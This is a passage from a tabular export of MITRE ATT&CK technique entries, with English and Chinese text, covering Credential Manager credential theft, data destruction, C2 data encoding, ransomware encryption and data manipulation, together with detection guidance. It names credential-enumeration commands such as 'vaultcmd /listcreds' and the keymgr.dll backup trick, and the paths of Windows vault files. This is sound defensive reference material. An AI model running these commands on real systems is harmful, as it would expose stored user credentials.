Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.

Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",https://attack.mitre.org/techniques/T1555/004,23 November 2020,21 October 2022,1.1,Credential Access,"Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)

Consider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

Consider monitoring file reads to Vault locations, <code>%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)",Windows,"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation",True,T1555,,Bernaldo Penas Antelo; Mugdha Peter Bansode; Uriel Kosayev; Vadim Khrykov,,,,,,,"(Citation: Talos Group123),(Citation: Symantec Waterbug Jun 2019),(Citation: PowerSploit Documentation),(Citation: SentinelOne Valak June 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: FireEye APT34 July 2019),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Delpy Mimikatz Crendential Manager),(Citation: GitHub LaZagne Dec 2018),(Citation: Bitdefender Naikon April 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: GitHub PowerSploit May 2012),(Citation: BiZone Lizar May 2021),(Citation: Microsoft Network access Credential Manager)",来自密码存储的凭据/从密码库中获取凭证：Windows 凭据管理器,攻击者可能会从 Windows 凭据管理器获取凭据。凭据管理器将用于登录通过 NTLM 或 Kerberos 进行身份验证的网站、应用程序和/或设备的凭据存储在凭据锁柜（以前称为 Windows Vaults）中。（引文：Microsoft 凭据管理器存储）（引文：Microsoft 凭据锁柜） Windows 凭据管理器将网站凭据与两个储物柜中的应用程序或网络凭据分开。作为 [来自 Web 浏览器的凭据](https://attack.mitre.org/techniques/T1555/003) 的一部分，Internet Explorer 和 Microsoft Edge 网站凭据由凭据管理器管理并存储在 Web 凭据锁定器中。应用程序和网络凭据存储在 Windows 凭据锁定器中。 Credential Lockers 将凭据存储在加密的 `.vcrd` 文件中，该文件位于 `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\` 下。可以在名为 <code>Policy.vpol</code> 的文件中找到加密密钥，该文件通常与凭据位于同一文件夹中。（引文：passcape Windows Vault）（引文：Malwarebytes The Windows Vault）攻击者可能会列出凭据由 Windows 凭据管理器通过多种机制进行管理。 <code>vaultcmd.exe</code> 是本机 Windows 可执行文件，可用于通过命令行界面枚举存储在 Credential Locker 中的凭据。攻击者还可以通过直接读取位于凭证储物柜内的文件来收集凭证。 Windows API，例如 <code>CredEnumerateA</code>，也可能被滥用来列出由凭据管理器管理的凭据。（引文：Microsoft CredEnumerate）（引文：Delpy Mimikatz 凭据管理器）攻击者也可能从凭据备份中获取凭据。可以通过运行 <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> 然后在“存储的用户名和密码”GUI 上选择“备份...”按钮来执行凭证备份和恢复。密码恢复工具还可以从凭据管理器中获取纯文本密码。（引用：Malwarebytes The Windows Vault）
T1485,Data Destruction,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).

In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)",https://attack.mitre.org/techniques/T1485,14 March 2019,25 March 2021,1.1,Impact,"Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\Windows\System32\</code>.

In cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.","IaaS, Linux, Windows, macOS","Cloud Storage: Cloud Storage Deletion, Command: Command Execution, File: File Deletion, File: File Modification, Image: Image Deletion, Instance: Instance Deletion, Process: Process Creation, Snapshot: Snapshot Deletion, Volume: Volume Deletion",False,,,"Brent Murphy, Elastic; David French, Elastic; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee; Varonis Threat Labs","Administrator, root, SYSTEM, User",,,,Availability,,"(Citation: Secureworks REvil September 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: Picus Sodinokibi January 2020),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Crowdstrike WhisperGate January 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: US-CERT Ukraine Feb 2016),(Citation: Cisco Ukraine Wipers January 2022),(Citation: McAfee Shamoon December 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: CERT-EE Gamaredon January 2021),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: FireEye Shamoon Nov 2016),(Citation: Symantec Shamoon 2012),(Citation: Cisco CaddyWiper March 2022),(Citation: Talos Olympic Destroyer 2018),(Citation: ESET CaddyWiper March 2022),(Citation: Microsoft WhisperGate January 2022),(Citation: Securelist BlackEnergy Feb 2015),(Citation: FireEye APT38 Oct 2018),(Citation: Novetta Blockbuster),(Citation: Unit 42 Kazuar May 2017),(Citation: Kaspersky StoneDrill 2017),(Citation: McAfee GhostSecret),(Citation: Intel 471 REvil March 2020),(Citation: Fortinet Diavol July 2021),(Citation: Cybereason WhisperGate February 2022),(Citation: Check Point Meteor Aug 2021),(Citation: ESET Telebots June 2017),(Citation: Medium S2W WhisperGate January 2022),(Citation: Unit42 Xbash Sept 2018),(Citation: ESET BlackEnergy Jan 2016),(Citation: Dragos Crashoverride 2017),(Citation: Volexity PowerDuke November 2016),(Citation: ESEST Black Energy Jan 2016),(Citation: Microsoft SDelete July 2016),(Citation: Kaspersky Sodin July 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Ready.gov IT DRP)",数据销毁,"攻击者可能会破坏特定系统或网络上的大量数据和文件，以中断系统、服务和网络资源的可用性。通过覆盖本地和远程驱动器上的文件或数据，数据破坏可能会导致存储的数据无法通过取证技术恢复。（引文：Symantec Shamoon 2012）（引文：FireEye Shamoon 2016 年 11 月）（引文：Palo Alto Shamoon 2016 年 11 月）（引文： Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) 常见的操作系统文件删除命令如 <code>del</code> 和 <code>rm</code> 通常只删除指向文件而不擦除文件本身的内容，使文件可通过适当的取证方法恢复。此行为不同于 [磁盘内容擦除](https://attack.mitre.org/techniques/T1561/001) 和 [磁盘结构擦除](https://attack.mitre.org/techniques/T1561/002)因为单个文件被破坏，而不是存储磁盘的部分或磁盘的逻辑结构。攻击者可能会尝试用随机生成的数据覆盖文件和目录，使其无法恢复。（引用：Kaspersky StoneDrill 2017）（引用：Unit 42 Shamoon3 2018）在某些情况下，政治导向的图像文件已被用于覆盖数据。（引用：FireEye Shamoon 2016 年 11 月）（引文：Palo Alto Shamoon 2016 年 11 月）（引文：Kaspersky StoneDrill 2017）在以网络范围的可用性中断为目标的运营中，为了最大限度地影响目标组织，旨在破坏数据的恶意软件可能具有类似蠕虫的功能通过利用 [有效帐户](https://attack.mitre.org/techniques/T1078)、[操作系统凭证转储](https://attack.mitre.org/techniques/T1003) 等其他技术在网络中传播, 和 [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)。（引文：Symantec Shamoon 2012）（引文：FireEye Shamoon 2016 年 11 月）（引文：Palo Alto Shamoon 2016 年 11 月)(引用：卡巴斯基 StoneDrill 2017)(引用：Talos Ol ympic 毁灭者 2018）。在云环境中，攻击者可能会利用访问权限来删除云存储、云存储帐户、机器映像和其他对运营至关重要的基础设施，从而损害组织或其客户。（引文：数据破坏 - 威胁帖）（引文：DOJ - Cisco Insider )"
T1132,Data Encoding,"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",https://attack.mitre.org/techniques/T1132,31 May 2017,14 March 2020,1.1,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,False,,,"Itzik Kotler, SafeBreach",User,,,,,,"(Citation: ProofPoint Ursnif Aug 2016),(Citation: Cisco H1N1 Part 2),(Citation: Mythc Documentation),(Citation: Anomali Linux Rabbit 2018),(Citation: Forcepoint Monsoon),(Citation: University of Birmingham C2)",数据编码,攻击者可能会对数据进行编码，以使命令和控制流量的内容更难以检测。命令和控制 (C2) 信息可以使用标准数据编码系统进行编码。数据编码的使用可能遵守现有的协议规范，包括使用 ASCII、Unicode、Base64、MIME 或其他二进制到文本和字符编码系统。（引用：维基百科二进制到文本编码）（引用：维基百科字符编码）一些数据编码系统也可能导致数据压缩，例如gzip。
T1132.002,Data Encoding: Non-Standard Encoding,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) ",https://attack.mitre.org/techniques/T1132/002,14 March 2020,14 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1132,,,User,,,,,,"(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: McAfee Oceansalt Oct 2018),(Citation: ESET InvisiMole June 2020),(Citation: NCSC Cyclops Blink February 2022),(Citation: FireEye APT30),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: McAfee Bankshot),(Citation: Unit42 RDAT July 2020),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Securelist ShadowPad Aug 2017),",数据编码：非标准编码,攻击者可能会使用非标准数据编码系统对数据进行编码，以使命令和控制流量的内容更难以检测。命令和控制 (C2) 信息可以使用不同于现有协议规范的非标准数据编码系统进行编码。非标准数据编码方案可能基于或与标准数据编码方案相关，例如针对 HTTP 请求的消息正文的修改 Base64 编码。（引文：Wikipedia Binary-to-text Encoding）（引文：Wikipedia Character Encoding )
T1132.001,Data Encoding: Standard Encoding,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",https://attack.mitre.org/techniques/T1132/001,14 March 2020,14 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1132,,,User,,,,,,"(Citation: Cyberreason Anchor December 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Kaspersky Sofacy),(Citation: Kaspersky Lyceum October 2021),(Citation: Trend Micro Tick November 2019),(Citation: Securelist Octopus Oct 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: JPCERT ChChes Feb 2017),(Citation: Unit 42 Inception November 2018),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Operation Groundbait),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye APT33 Guardrail),(Citation: Zscaler Cobian Aug 2017),(Citation: Palo Alto DNS Requests),(Citation: Unit 42 DarkHydrus July 2018),(Citation: ESET ForSSHe December 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Forcepoint Monsoon),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Palo Alto menuPass Feb 2017),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Kaspersky Carbanak),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: ESET Ebury Feb 2014),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 Valak July 2020),(Citation: Symantec Dragonfly),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Bisonal Mar 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: FireEye APT28),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit 42 PingPull Jun 2022),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Okrum July 2019),(Citation: Cymmetria Patchwork),(Citation: Unit 42 Kazuar May 2017),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Check Point APT34 April 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: Trend Micro IXESHE 2012),(Citation: Unit 42 QUADAGENT July 2018),(Citation: GitHub Sliver HTTP),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Medium KONNI Jan 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Moran 2013),(Citation: Lotus Blossom Jun 2015),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft HAFNIUM March 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Securelist Machete Aug 2014),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Fysbis Dr Web Analysis),(Citation: Forcepoint Felismus Mar 2017),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Unit42 RDAT July 2020),(Citation: Unit42 BabyShark Feb 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: CISA WellMess July 2020),",数据编码：标准编码,攻击者可以使用标准数据编码系统对数据进行编码，以使命令和控制流量的内容更难以检测。命令和控制 (C2) 信息可以使用符合现有协议规范的标准数据编码系统进行编码。常见的数据编码方案包括 ASCII、Unicode、十六进制、Base64 和 MIME。(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) 一些数据编码系统也可能导致数据压缩，例如 gzip。
T1486,Data Encrypted for Impact,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)

In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) 

To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as ""print bombing"").(Citation: NHS Digital Egregor Nov 2020)

In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)",https://attack.mitre.org/techniques/T1486,15 March 2019,16 June 2022,1.4,Impact,"Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.

In some cases, monitoring for unusual kernel driver installation activity can aid in detection.

In cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.","IaaS, Linux, Windows, macOS","Cloud Storage: Cloud Storage Metadata, Cloud Storage: Cloud Storage Modification, Command: Command Execution, File: File Creation, File: File Modification, Network Share: Network Share Access, Network Share: Network Share Access, Process: Process Creation",False,,,"ExtraHop; Harshal Tupsamudre, Qualys; Mayuresh Dani, Qualys; Oleg Kolesnikov, Securonix; Travis Smith, Qualys",,,,,Availability,,"(Citation: Trend Micro Ransomware February 2021),(Citation: CrowdStrike Ryuk January 2019),(Citation: NCC Group WastedLocker June 2020),(Citation: McAfee REvil October 2019),(Citation: Cynet Ragnar Apr 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Crowdstrike Indrik November 2018),(Citation: Medium Babuk February 2021),(Citation: Unit42 Clop April 2021),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Cuba April 2021),(Citation: Unit42 LockerGoga 2019),(Citation: US-CERT NotPetya 2017),(Citation: Secureworks REvil September 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: Cybereason Clop Dec 2020),(Citation: Picus Sodinokibi January 2020),(Citation: Secure List Bad Rabbit),(Citation: Cybleinc Conti January 2020),(Citation: Cylance Sodinokibi July 2019),(Citation: Sophos Ragnar May 2020),(Citation: FireEye Maze May 2020),(Citation: CarbonBlack Conti July 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: FireEye WannaCry 2017),(Citation: Wired Lockergoga 2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: FireEye FiveHands April 2021),(Citation: mbed-crypto),(Citation: FireEye APT41 Aug 2019),(Citation: Cybereason Conti Jan 2021),(Citation: SecureWorks WannaCry Analysis),(Citation: Mcafee Clop Aug 2019),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: McAfee Babuk February 2021),(Citation: NCC Group Fivehands June 2021),(Citation: IBM MegaCortex),(Citation: Talos Nyetya June 2017),(Citation: Proofpoint TA505 Sep 2017),(Citation: Dragos EKANS),(Citation: CarbonBlack LockerGoga 2019),(Citation: Group IB Ransomware September 2020),(Citation: TrendMicro Netwalker May 2020),(Citation: Palo Alto Shamoon Nov 2016),(Citation: wardle evilquest partii),(Citation: NHS Digital Egregor Nov 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: FireEye APT38 Oct 2018),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Carbon Black JCry May 2019),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: LogRhythm WannaCry),(Citation: CERT-FR PYSA April 2020),(Citation: Intel 471 REvil March 2020),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Fortinet Diavol July 2021),(Citation: Sophos SamSam Apr 2018),(Citation: Symantec WastedLocker June 2020),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: ClearkSky Fox Kitten February 2020),(Citation: Talos Sodinokibi April 2019),(Citation: Unit42 Xbash Sept 2018),(Citation: Palo Alto Unit 42 EKANS),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Cybereason Egregor Nov 2020),(Citation: Check Point Pay2Key November 2020),(Citation: KillDisk Ransomware),(Citation: Kaspersky Sodin July 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Rhino S3 Ransomware Part 2),(Citation: Ready.gov IT DRP),(Citation: win10_asr)",加密数据实现影响和破环,攻击者可能会加密目标系统或网络中大量系统上的数据，以中断系统和网络资源的可用性。他们可以尝试通过加密本地和远程驱动器上的文件或数据并阻止对解密密钥的访问来使存储的数据无法访问。这样做可能是为了从受害者那里获得金钱补偿，以换取解密或解密密钥（勒索软件），或者在未保存或传输密钥的情况下使数据永久不可访问。（引用：US-CERT 勒索软件 2016） （引用：FireEye WannaCry 2017）（引用：US-CERT NotPetya 2017）（引用：US-CERT SamSam 2018）在勒索软件的情况下，常见的用户文件通常是 Office 文档、PDF、图像、视频、音频、文本和源代码文件将被加密（并且通常用特定的文件标记重命名和/或标记）。攻击者可能需要首先采用其他行为，例如 [文件和目录权限修改](https://attack.mitre.org/techniques/T1222) 或 [系统关闭/重启](https://attack.mitre.org /techniques/T1529），以便解锁和/或获得操作这些文件的权限。（引用：CarbonBlack Conti 2020 年 7 月）在某些情况下，攻击者可能会加密关键系统文件、磁盘分区和 MBR。（引用：美国-CERT NotPetya 2017）为了最大限度地提高对目标组织的影响，设计用于加密数据的恶意软件可能具有类似蠕虫的功能，可以利用其他攻击技术（如 [有效帐户]（https://attack.mitre.org/）在网络中传播）技术/T1078)、[操作系统凭据转储](https://attack.mitre.org/techniques/T1003) 和 [SMB/Windows 管理员共享](https://attack.mitre.org/techniques/T1021/002 ).（引用：FireEye WannaCry 2017）（引用：US-CERT NotPetya 2017）加密恶意软件也可能利用 [Internal Defacement]（https://attack.mitre.org/techn iques/T1491/001），例如更改受害者壁纸，或通过向连接的打印机发送勒索信或其他消息来恐吓受害者（称为“打印轰炸”）。（引用：NHS Digital Egregor 2020 年 11 月）在云环境中，存储受感染帐户中的对象也可能被加密。（引用：Rhino S3 Ransomware Part 1）
T1565,Data Manipulation,"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.

The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565,02 March 2020,19 April 2022,1.1,Impact,"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.","Linux, Windows, macOS","File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution",False,,,,,,,,Integrity,,",(Citation: Ready.gov IT DRP)",篡改数据,攻击者可能会插入、删除或操纵数据以影响外部结果或隐藏活动，从而威胁数据的完整性。通过操纵数据，对手可能会试图影响业务流程、组织理解或决策制定。修改的类型及其将产生的影响取决于目标应用程序和过程以及对手的目标和目的。对于复杂的系统，对手可能需要特殊的专业知识，并可能需要访问与系统相关的专业软件，这些软件通常需要通过长时间的信息收集活动才能产生预期的影响。
T1565.003,Data Manipulation: Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565/003,02 March 2020,25 March 2022,1.1,Impact,"Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.","Linux, Windows, macOS","File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Process: OS API Execution",True,T1565,,,"Administrator, root, SYSTEM, User",,,,Integrity,,"(Citation: FireEye APT38 Oct 2018),",篡改数据：运行时数据操作,攻击者可能会修改系统以在最终用户访问和显示数据时对其进行操作，从而威胁数据的完整性。（引文：FireEye APT38 Oct 2018）（引文：DOJ Lazarus Sony 2018）通过操纵运行时数据，对手可能会试图影响业务流程、组织理解和决策。攻击者可能会更改用于显示数据的应用程序二进制文件以导致运行时操作。攻击者还可能进行 [更改默认文件关联](https://attack.mitre.org/techniques/T1546/001) 和 [伪装](https://attack.mitre.org/techniques/T1036) 以造成类似的影响。修改的类型及其将产生的影响取决于目标应用程序和过程以及对手的目标和目的。对于复杂的系统，对手可能需要特殊的专业知识，并可能需要访问与系统相关的专业软件，这些软件通常需要通过长时间的信息收集活动才能产生预期的影响。
T1565.001,Data Manipulation: Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565/001,02 March 2020,19 April 2022,1.1,Impact,"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.","Linux, Windows, macOS","File: File Creation, File: File Deletion, File: File Modification",True,T1565,,,,,,,Integrity,,"(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Ready.gov IT DRP)",篡改数据：存储数据操作,攻击者可能会插入、删除或操纵静态数据以影响外部结果或隐藏活动，从而威胁数据的完整性。（引文：FireEye APT38 Oct 2018）（引文：DOJ Lazarus Sony 2018）通过操纵存储的数据，对手可能会试图影响业务流程、组织理解和决策。存储的数据可能包括各种文件格式，例如 Office 文件、数据库、存储的电子邮件和自定义文件格式。修改的类型及其影响取决于数据类型以及对手的目标和目的。对于复杂的系统，对手可能需要特殊的专业知识，并可能需要访问与系统相关的专业软件，这些软件通常需要通过长时间的信息收集活动才能产生预期的影响。
